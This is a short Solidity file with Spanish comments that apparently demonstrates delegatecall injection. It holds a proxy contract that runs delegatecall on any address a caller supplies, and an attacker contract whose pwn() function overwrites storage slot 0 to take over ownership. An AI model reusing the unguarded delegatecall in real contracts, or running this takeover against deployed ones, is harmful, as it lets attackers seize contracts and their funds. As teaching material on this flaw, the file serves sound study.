// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title ProxyVulnerable
 * @notice VULNERABLE CONTRACT — Permite inyección de delegatecall
 */
contract ProxyVulnerable {
    // Ranura de almacenamiento (Slot) 0
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // VULNERABILIDAD: Se pasa un '_target' arbitrario sin sanitizar
    function executeDelegated(address _target, bytes memory _data) external {
        (bool success, ) = _target.delegatecall(_data);
        require(success, "Delegatecall fallo");
    }
}

/**
 * @title AttackerLogic
 * @dev El contrato malicioso que inyectará la lógica destructiva
 */
contract AttackerLogic {
    // Imitamos la estructura de almacenamiento del ProxyVulnerable para 
    // asegurar que apuntamos exactamente a la misma ranura de memoria (Slot 0)
    address public owner;

    // Esta función se ejecutará bajo el contexto del ProxyVulnerable
    function pwn() external {
        // tx.origin es la billetera que originó la transacción (el atacante)
        owner = tx.origin; 
    }
}